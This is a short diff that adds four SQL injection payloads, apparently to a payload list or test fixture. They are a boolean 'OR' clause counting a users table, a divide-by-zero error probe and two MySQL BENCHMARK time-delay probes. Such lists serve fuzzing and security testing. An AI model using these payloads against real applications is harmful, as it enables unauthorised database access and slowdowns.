@@ -1,0 +1,4 @@
+' OR (SELECT COUNT(*) FROM users) --
+' OR (SELECT 1/0) --
+' OR (SELECT BENCHMARK(1000000,MD5('test'))) --
+' OR (SELECT IF(1=1, BENCHMARK(1000000,MD5('test')), 0)) --
